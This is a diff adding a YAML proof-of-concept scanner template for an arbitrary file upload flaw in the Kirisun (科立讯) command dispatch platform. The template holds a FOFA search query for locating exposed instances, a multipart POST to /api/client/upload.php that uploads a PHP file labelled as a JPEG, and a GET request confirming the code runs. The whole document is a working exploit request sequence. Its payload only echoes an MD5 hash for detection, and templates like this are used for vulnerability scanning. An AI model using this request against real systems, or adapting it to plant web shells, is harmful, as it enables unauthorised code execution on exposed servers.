@@ -1,0 +1,34 @@
+id: poc-yaml-kirisun-upload-anyfile-rce
+info:
+  name: 福建科立讯通信指挥调度平台upload.php 任意文件上传
+  severity: critical
+  tags:
+  - 任意写入
+  finger: 科立讯指挥调度管理平台
+  fofa: body="app/structure/departments.php" || app="指挥调度管理平台"
+variables:
+  filename: to_lower(random_str(10))
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api/client/upload.php
+  headers:
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M
+  data: '------WebKitFormBoundaryVBf7Cs8QWsfwC82M
+
+    Content-Disposition: form-data; name="ulfile"; filename="{{.filename}}.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php echo md5({{.t1}});?>
+
+    ------WebKitFormBoundaryVBf7Cs8QWsfwC82M--
+
+    '
+  expression: "status_code == 200 && \nbody == \"\"\n"
+- method: GET
+  path: /upload/{{.filename}}.php
+  expression: "status_code == 200 && \nbody == t2\n"
+transport: http
